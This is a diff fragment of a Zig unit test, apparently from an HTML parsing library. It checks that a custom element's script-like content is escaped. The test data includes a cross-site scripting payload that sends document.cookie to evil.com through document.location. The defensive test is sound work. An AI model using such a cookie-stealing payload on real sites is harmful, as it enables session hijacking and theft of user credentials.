+
+    try testing.expect(
+        std.mem.indexOf(u8, widget_content, "document.cookie") != null,
+    );
+    try testing.expect(
+        std.mem.indexOf(u8, widget_content, "evil.com") != null,
+    );
+
+    // Custom elements should be escaped
+    try testing.expect(!z.isNoEscapeElement(widget_elt));
+
+    const allocator = testing.allocator;
+    const escaped_content = try z.escapeHtml(allocator, widget_content);
+    defer allocator.free(escaped_content);
+
+    const expected = "document.location = &#39;https://evil.com?data=&#39; + document.cookie;";
+    try testing.expectEqualStrings(expected, escaped_content);
 }
